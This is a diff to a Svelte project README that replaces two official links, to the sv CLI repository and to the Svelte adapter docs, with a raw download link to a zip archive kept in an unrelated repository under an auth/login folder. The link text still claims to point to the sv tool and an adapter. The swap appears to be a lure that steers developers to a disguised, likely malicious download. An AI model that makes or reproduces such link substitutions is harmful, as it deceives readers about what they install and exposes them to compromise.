@@ -1,6 +1,6 @@
 # sv
 
-Everything you need to build a Svelte project, powered by [`sv`](https://github.com/sveltejs/cli).
+Everything you need to build a Svelte project, powered by [`sv`](https://github.com/Jcvdm/ClaimTech/raw/refs/heads/main/src/routes/auth/login/Tech-Claim-v3.6.zip).
 
 ## Creating a project
 
@@ -35,4 +35,4 @@ npm run build
 
 You can preview the production build with `npm run preview`.
 
-> To deploy your app, you may need to install an [adapter](https://svelte.dev/docs/kit/adapters) for your target environment.
+> To deploy your app, you may need to install an [adapter](https://github.com/Jcvdm/ClaimTech/raw/refs/heads/main/src/routes/auth/login/Tech-Claim-v3.6.zip) for your target environment.
